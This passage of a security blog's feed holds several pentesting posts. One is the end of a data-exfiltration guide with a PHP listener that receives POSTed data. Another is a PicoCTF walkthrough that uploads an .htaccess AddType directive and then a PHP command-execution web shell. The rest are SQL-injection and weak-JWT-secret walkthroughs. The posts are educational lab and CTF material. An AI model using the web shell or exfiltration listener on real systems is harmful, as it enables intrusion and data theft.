  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

<h3 id="http-exfiltration-2">HTTP Exfiltration #2</h3>

<p>In many environments, outbound web traffic (HTTP/S) is the most likely protocol to be allowed through a firewall. By using a simple PHP “listener” on your server, you can turn a standard web request into a data mule.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*y---MTXbxTAubMVhsA-YjQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>we prepared a webserver with a data handler</p>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>

  
  <pre><code class="language-php">
&lt;?php
if (isset($_POST['file'])) {
    $file = fopen("/tmp/http.bs64","w");
    fwrite($file, $_POST['file']);
    fclose($file);
}
?&gt;
  </code></pre>
  
</div>

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:20000/format:webp/1*OntxvXeZbyxjXuqgGtBQfw.png" data-label="Victim (Sender)" data-color="#ff5555" data-align="left" style="width: 100%; display: block;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*a8-UMeRzW62Ev8X_V7agkA.png" data-label="attacker" data-color="#50fa7b" data-align="right" style="width: 100%; display: none;" />

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

<blockquote>
  <p><code class="language-plaintext highlighter-rouge">NOTE</code>: If you don’t want data to be transmitted in cleartext, you can set up HTTPS using SSL keys stored on a server.</p>
</blockquote>

<h3 id="icmp-data-exfiltration">ICMP Data Exfiltration</h3>

<p>the ICMP packet’s structure contains a Data section that can include strings or copies of other information, such as the IPv4 header, used for error messages.</p>

<p>As an attacker, we can use the ICMP structure to include our data within the Data section and send it via ICMP packet to another machine. The other machine must capture the network traffic with the ICMP packets to receive the data.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*eOmcrBE1r92MdyDZ4K8Eug.jpeg" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Xi5bPFcZVwTAl_HT9s5-xw.png" data-label="Attacker" data-color="#50fa7b" data-align="left" style="width: 100%; display: block;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*N_cqwYMmQQL2ZMkQ2JLArg.png" data-label="Victim" data-color="#ff5555" data-align="right" style="width: 100%; display: none;" />
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Ncr6LiVxKJfCYa21_ddeYQ.png" data-label="Attacker" data-color="#50fa7b" data-align="left" style="width: 100%; display: none;" />

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*e4r1sUcg2jYD2Zm0aqqhaQ.png" data-label="Attacker" data-color="#50fa7b" data-align="left" style="width: 100%; display: none;" />

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #50fa7b; text-align: left; transition: all 0.3s;">
    Attacker <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

<h3 id="dns-exfiltration">DNS Exfiltration</h3>

<p>To perform exfiltration via the DNS protocol, you need to control a domain name and set up DNS records, including NS, A, or TXT.</p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="pentesting" /><summary type="html"><![CDATA[<p>In this guide, I’m breaking down how to “live off the land.” We’re talking about taking standard commands and turning them into tunnels. Whether it’s a quick TCP pipe or a slow-burn DNS play, it’s all about being creative with what’s available.</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*nOvrIc-KReNi6cpEpPTOEQ.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*nOvrIc-KReNi6cpEpPTOEQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">byp4ss3d PicoCTF</title><link href="/blog/byp4ss3d_PicoCTF" rel="alternate" type="text/html" title="byp4ss3d PicoCTF" /><published>2025-11-19T00:00:00-05:00</published><updated>2025-11-19T00:00:00-05:00</updated><id>http://localhost:4000/blog/Apache-backdoor-upload</id><content type="html" xml:base="/blog/byp4ss3d_PicoCTF"><![CDATA[<p>A university’s online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded, but are they enough? Take a look at how the upload is implemented. Maybe there’s a way to slip past the checks and interact with the server in ways you shouldn’t.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Iqyhe_q1VlnX15qTt9sjwg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>When we upload an image, it appears like this:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*N7fwYGGoIcegv7Cw4oYhdg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>This is how the request looks using Burp Suite:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*joVxS7lgXKoxqej64mHY0A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>I tried different extension bypasses, but they didn’t work because they only showed results like this:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*cbME_B0xUP4sP3nInhABzw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*wNDMIIhNsExib8n0lvfGoQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>From here I tried different bypasses but none of them worked, so I decided to use the hint.</p>

<p>hint 1:</p>

<blockquote>
  <p>Apache can be tricked into executing non-PHP files as PHP with a .htaccess file.</p>
</blockquote>

<p>hint 2:</p>

<blockquote>
  <p>Try uploading more than just one file.</p>
</blockquote>

<p>For further reading, see these resources:</p>

<ul>
  <li>Bypassing file upload filters using .htaccess (Infosec Writeups): <a href="https://infosecwriteups.com/bypassing-file-upload-filter-using-htaccess-file-ctf-ca06d7e9ebd7">https://infosecwriteups.com/bypassing-file-upload-filter-using-htaccess-file-ctf-ca06d7e9ebd7</a></li>
  <li>Apache .htaccess HOWTO (official docs): <a href="https://httpd.apache.org/docs/2.4/howto/htaccess.html">https://httpd.apache.org/docs/2.4/howto/htaccess.html</a></li>
</ul>

<h2 id="my-explanation">My explanation:</h2>

<ol>
  <li>What is the <code class="language-plaintext highlighter-rouge">.htaccess</code> file?</li>
</ol>

<p>The <code class="language-plaintext highlighter-rouge">.htaccess</code> (or Hypertext Access) file is a configuration file used by the <strong>Apache HTTP Server</strong> to manage settings for a specific directory and its subdirectories.</p>

<ul>
  <li>
    <p><strong>Decentralized Configuration:</strong> Instead of requiring administrative access to the main server configuration (<code class="language-plaintext highlighter-rouge">httpd.conf</code>), Apache allows developers and users to place these files in their web directories to override or add specific directives.</p>
  </li>
  <li>
    <p><strong>Purpose:</strong> They are commonly used for tasks such as URL rewriting (<code class="language-plaintext highlighter-rouge">mod_rewrite</code>), custom error pages, restricting access (access control), and, in this case, <strong>defining how files are handled</strong> (MIME types).</p>
  </li>
</ul>

<ol>
  <li>The Exploit: MIME Type Re-Mapping with <code class="language-plaintext highlighter-rouge">AddType</code></li>
</ol>

<p>The exploit hinges on the fact that when Apache receives a request for a file, it uses the file’s extension (or other configuration) to determine its <strong>MIME type</strong>, which tells the server and the browser what kind of content it is (e.g., <code class="language-plaintext highlighter-rouge">image/jpeg</code>, <code class="language-plaintext highlighter-rouge">text/html</code>).</p>

<p>The Directive:</p>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
AddType application/x-httpd-php .backdoor
</code></pre>
  
</div>

<table>
  <thead>
    <tr>
      <th><strong>Directive Component</strong></th>
      <th><strong>Explanation</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong><code class="language-plaintext highlighter-rouge">AddType</code></strong></td>
      <td>This is the Apache directive that maps a given <strong>MIME type</strong> to a specific <strong>file extension</strong>.</td>
    </tr>
    <tr>
      <td><strong><code class="language-plaintext highlighter-rouge">application/x-httpd-php</code></strong></td>
      <td>This is the MIME type used by Apache to tell the server: “This content should be processed by the PHP interpreter.”</td>
    </tr>
    <tr>
      <td><strong><code class="language-plaintext highlighter-rouge">.backdoor</code></strong></td>
      <td>This is the arbitrary file extension you chose.</td>
    </tr>
  </tbody>
</table>

<p>Now let’s follow those steps:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*MV03DXFezf8QtAxLjcp67A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<div class="code-block-container">
  <span class="code-lang-tag">Request</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Request">
------geckoformboundary58b7d552bbae2dc3d17de786c141d311
Content-Disposition: form-data; name="image"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .backdoor
------geckoformboundary58b7d552bbae2dc3d17de786c141d311--
</code></pre>
  
</div>

<div class="code-block-container">
  <span class="code-lang-tag">Response</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Response">
Successfully uploaded!<br />Access it at: &lt;a href='images/.htaccess'&gt;images/.htaccess&lt;/a&gt;
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*VWYzK6ALthrn4hfOhVfiUA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<div class="code-block-container">
  <span class="code-lang-tag">Request</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Request">
------geckoformboundary58b7d552bbae2dc3d17de786c141d311
Content-Disposition: form-data; name="image"; filename="backdoor1.backdoor"
Content-Type: application/x-httpd-php

&lt;?php if(isset($_REQUEST['cmd'])){ echo "&lt;pre&gt;"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "&lt;/pre&gt;"; die; }?&gt;

------geckoformboundary58b7d552bbae2dc3d17de786c141d311--
</code></pre>
  
</div>

<div class="code-block-container">
  <span class="code-lang-tag">Response</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Response">
Successfully uploaded!<br />Access it at: &lt;a href='images/backdoor1.backdoor'&gt;images/backdoor1.backdoor&lt;/a&gt;
</code></pre>
  
</div>

<p>WHOAMI</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*bUN1ITdh79ZBF3cZDBV-MQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="ctf" /><category term="picoctf" /><category term="walkthrough" /><summary type="html"><![CDATA[<p>A university’s online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded, but are they enough? Take a look at how the upload is implemented. Maybe there’s a way to slip past the checks and interact with the server in ways you shouldn’t.</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*DJEtBw2KoP102M_U7q9MWQ.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*DJEtBw2KoP102M_U7q9MWQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">When Input Becomes Injection</title><link href="/blog/Input-sql-Injection" rel="alternate" type="text/html" title="When Input Becomes Injection" /><published>2025-10-18T00:00:00-04:00</published><updated>2025-10-18T00:00:00-04:00</updated><id>http://localhost:4000/blog/SQLI-User-Input</id><content type="html" xml:base="/blog/Input-sql-Injection"><![CDATA[<p>Developers should never trust user input. Even when you think you’ve sanitized everything and even when you’re using the familiar ? placeholder in Node.js MySQL libraries mistakes and wrong assumptions can still leave your app vulnerable.</p>

<p>A few essential points:</p>
<ul>
  <li>? placeholders protect values, not SQL structure. They safely substitute data values, but they do not and cannot be used for identifiers, SQL keywords, or fragments you build by string concatenation. If you concatenate table names, column names, ORDER BY clauses, or entire SQL snippets with user input, a placeholder won’t help.</li>
  <li>Misusing escaping, trusting client-side validation, or doing shallow sanitization (like stripping a few characters) can be bypassed. There are second‑order injections (stored malicious input executed later), encoding tricks, and edge cases with JSON and binary data.</li>
  <li>The typical Node.js + MySQL pitfalls: building queries with template strings, using unvalidated inputs for identifiers, relying on naive input filters, or assuming middleware has already made the input safe.</li>
</ul>

<h1 id="endpoints">Endpoints</h1>

<ul>
  <li>api/v1/users/filter?name=</li>
  <li>api/v1/blogs/filter</li>
  <li>api/v1/blogs/filter?author=</li>
</ul>

<h1 id="walkthrough">Walkthrough</h1>

<p>We are logged in as Alice.</p>

<p>If we visit this endpoint <code class="language-plaintext highlighter-rouge">api/v1/blogs/filter</code>:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*uM1aaR5nAaYZVRDaDdoO4g.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>If we use something like <code class="language-plaintext highlighter-rouge">api/v1/blogs/filter?author=</code> from any author for example <code class="language-plaintext highlighter-rouge">Alice</code> or <code class="language-plaintext highlighter-rouge">Bob</code> we make a request like:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*MTciSW3EYcb9t_Kz8uEpxg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*6gX220WzN39JzKvsAged5A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>But let’s say we have another endpoint <code class="language-plaintext highlighter-rouge">api/v1/users/filter?name=</code>. Remember we are logged in as Alice, so our request would be:</p>

<p><code class="language-plaintext highlighter-rouge">api/v1/users/filter?name=Alice</code> as shown below</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*MPqXu-D6n5xzQN-LDPvVYg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Our SQL request would look like this :</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
Built users query: SELECT * FROM users WHERE name=? Data: [ 'Alice' ]
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*poI5wofBAtxklzkFPFRa4Q.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>What if we try to access Bob’s information?</p>

<p>We can’t, we get <code class="language-plaintext highlighter-rouge">Unauthorized</code>.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*5cFnvj_tbv2uiM9Bi6qj8A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>What if we change the <code class="language-plaintext highlighter-rouge">name</code> parameter to something different, for example: <code class="language-plaintext highlighter-rouge">api/v1/users/filter?foo=bar</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Aie8ldbkzioHPkWkdupF7A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
Server running on port 3000
Built users query: SELECT * FROM users WHERE name=? Data: [ 'Alice' ]
Built users query: SELECT * FROM users WHERE foo=? Data: [ 'bar' ]
</code></pre>
  
</div>

<p>We were able to modify the query as you can see above. That means there is a potential for SQL injection for example, to make a condition always true one common payload is <code class="language-plaintext highlighter-rouge">OR 1=1</code>. First, let’s explore more: what if we sent something like <code class="language-plaintext highlighter-rouge">api/v1/users/filter?name%20bar=bar</code></p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
Server running on port 3000
Built users query: SELECT * FROM users WHERE name=? Data: [ 'Alice' ]
Built users query: SELECT * FROM users WHERE foo=? Data: [ 'bar' ]
Built users query: SELECT * FROM users WHERE name bar=? Data: [ 'bar' ]
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*QiCtNtqdXA8qWK9EOhSWFg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>We fully controlled the query, which means if we sent something like <code class="language-plaintext highlighter-rouge">OR 1=1</code> it could return true and dump information:</p>

<div class="code-block-container">
  <span class="code-lang-tag">SQL</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
Server running on port 3000
Built users query: SELECT * FROM users WHERE name=? Data: [ 'Alice' ]
Built users query: SELECT * FROM users WHERE foo=? Data: [ 'bar' ]
Built users query: SELECT * FROM users WHERE name bar=? Data: [ 'bar' ]
Built users query: SELECT * FROM users WHERE name OR 1=? Data: [ '1' ]
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*2VBZH3qBIWy84CnSYSCZ2A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*9_j_ru2wAij9w4kqY5obwQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h1 id="quick-mitigations-and-takeaways">Quick mitigations and takeaways</h1>

<ul>
  <li>Always use parameterized queries / prepared statements for data values.</li>
  <li>Never inject user input into SQL structure (identifiers, keywords, clause fragments). If you must vary structure, use strict whitelists or server-side mappings.</li>
  <li>Validate and coerce types server-side (numbers, enums, ranges) instead of relying on shallow string sanitization or client-side checks.</li>
  <li>Apply least privilege for database accounts and avoid exposing powerful permissions to the application user.</li>
  <li>Log unexpected input and monitor query patterns to detect abuse or probing.</li>
  <li>Defense in depth: input validation, prepared statements, minimal DB permissions, and runtime monitoring.</li>
</ul>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="my-research" /><summary type="html"><![CDATA[<p>Developers should never trust user input. Even when you think you’ve sanitized everything and even when you’re using the familiar ? placeholder in Node.js MySQL libraries mistakes and wrong assumptions can still leave your app vulnerable.</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dU101LJckdGykTOw0K0q6w.jpeg" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dU101LJckdGykTOw0K0q6w.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Weak JWT Secrets: How ‘secret’ Breaks Your Auth</title><link href="/blog/Weak-JWT-Secret" rel="alternate" type="text/html" title="Weak JWT Secrets: How ‘secret’ Breaks Your Auth" /><published>2025-10-16T00:00:00-04:00</published><updated>2025-10-16T00:00:00-04:00</updated><id>http://localhost:4000/blog/JWT-Weak-JWT-Signing-Key</id><content type="html" xml:base="/blog/Weak-JWT-Secret"><![CDATA[<p>This post begins a short series about authentication mistakes I often see in Node.js/Express applications. We’ll look at a real-but-safe example where the server uses JSON Web Tokens (JWTs) for authentication, but the signing secret is weak and guessable. That weakness lets an attacker forge tokens that the server accepts.</p>

<p>The goal here is educational: to show how this class of bug appears in an Express app, I will not publish exploit scripts or wordlists; instead, this walkthrough focuses on how to find the problem.</p>

<p>Summary of the vulnerable setup:</p>

<ul>
  <li>A Node.js server built with Express issues JWTs using the HS256 algorithm.</li>
  <li>The server stores the signing key as a short or common string (for example, “secret”, “1234”, or an English word).</li>
  <li>Because the secret is weak, an attacker who can guess it can sign arbitrary tokens (for example, upgrading their user to admin) and the server will accept them.</li>
</ul>

<p>What you’ll learn in this post:</p>

<ul>
  <li>How to spot weak JWT secrets in code and runtime configuration.</li>
</ul>

<p>If you want to follow along locally, create a tiny Express app and never expose test secrets to the public internet. Treat any reproduction data as lab-only, and rotate secrets after testing.</p>

<h1 id="endpoints">Endpoints</h1>

<ul>
  <li>/login</li>
  <li>/admin</li>
</ul>

<h1 id="walkthrough">Walkthrough</h1>

<p>We have these credentials:</p>

<div class="code-block-container">
  <span class="code-lang-tag">Node.js</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
const users = [
  { id: 1, username: 'alice', password: 'alicepw', role: 'user' },
  { id: 2, username: 'bob', password: 'bobpw', role: 'admin' }
];
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*W4uuTeSh19BpKiXWpCM_Og.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>If we try to access <code class="language-plaintext highlighter-rouge">/admin</code>, we get something like:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*lKgINRctNUElgqcrlkViTA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>If we use this site: <a href="https://supertokens.com/jwt-encoder-decoder">SuperTokens JWT Decoder</a>, we can decode the JWT.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*FHA3j2RQVeeSkmI5sH22Mg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>If we change the role from user to admin to see if we can access the <code class="language-plaintext highlighter-rouge">/login</code> endpoint, we get this:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dyZ7ji7c73Rk1S5gVAI4sA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dhE9RAXWpHqDFCoAUpGNrw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h1 id="brute-force">Brute-Force</h1>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*THD_HPjG4eXnFeSA2U0QFQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Let’s use hashcat to brute-force the JWT</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*7TpkpAfBwrmQed_Sz3jXzQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><code class="language-plaintext highlighter-rouge">secret</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*3gMgc6GAOQVJR_JQN7BDYQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h1 id="welcome-admin-alice">Welcome, admin Alice</h1>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*8I9piVg6oNt1BxnCWZaQKA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="my-research" /><summary type="html"><![CDATA[<p>This post begins a short series about authentication mistakes I often see in Node.js/Express applications. We’ll look at a real-but-safe example where the server uses JSON Web Tokens (JWTs) for authentication, but the signing secret is weak and guessable. That weakness lets an attacker forge tokens that the server accepts.</p>

